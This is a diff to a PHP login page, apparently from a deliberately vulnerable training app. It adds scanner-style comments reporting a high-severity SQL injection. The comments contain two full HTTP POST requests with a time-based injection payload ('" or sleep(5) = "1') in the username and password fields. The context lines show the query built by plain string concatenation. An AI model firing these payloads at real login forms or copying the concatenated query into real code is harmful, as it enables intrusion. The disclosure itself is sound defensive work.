@@ -7,6 +7,30 @@
 		$username = '"' . $username . '"';
 		$pwd = '"' . $pwd . '"';
 		$sql="SELECT * FROM users WHERE name=($username) and password=($pwd)";
+		// TODO: AI issue #4, High, SQL Injection, https://github.com/rbm1718/bricks/issues/4
+		//
+		// POST /login-4/index.php HTTP/1.1
+		// Host: localhost
+		// Accept-Encoding: identity
+		// Connection: close
+		// Content-Length: 65
+		// Content-Type: application/x-www-form-urlencoded
+		//
+		// passwd=&submit=935137890000&username=%22+or+sleep%285%29+%3D+%221
+		//
+		// mysql_select_db(NULL, True)
+		// TODO: AI issue #4, High, SQL Injection, https://github.com/rbm1718/bricks/issues/4
+		//
+		// POST /login-4/index.php HTTP/1.1
+		// Host: localhost
+		// Accept-Encoding: identity
+		// Connection: close
+		// Content-Length: 65
+		// Content-Type: application/x-www-form-urlencoded
+		//
+		// passwd=%22+or+sleep%285%29+%3D+%221&submit=935137890000&username=
+		//
+		// mysql_select_db(NULL, True)
 		$result=mysql_query($sql);
 		$count=mysql_num_rows($result);
 		$sSuccessMsg = ($count>0?
